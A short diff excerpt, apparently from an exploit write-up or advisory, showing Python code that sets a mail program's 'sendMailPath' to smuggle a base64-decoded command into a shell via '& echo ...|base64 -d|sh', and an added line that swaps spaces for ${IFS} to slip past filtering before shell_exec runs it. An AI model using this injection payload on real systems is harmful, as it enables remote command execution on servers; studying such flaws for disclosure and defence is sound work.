@@ -37,6 +37,8 @@ data = {
     'sendMailPath': f'/usr/sbin/sendmail & echo {cmd}|base64 -d|sh',
     'mailProgram': 'sendmail',
 }
+
+data['sendMailPath'] = data['sendMailPath'].replace(' ', '${IFS}')
 ```
 As a result, the shell command that gets executed via ```shell_exec``` will being:
 ```
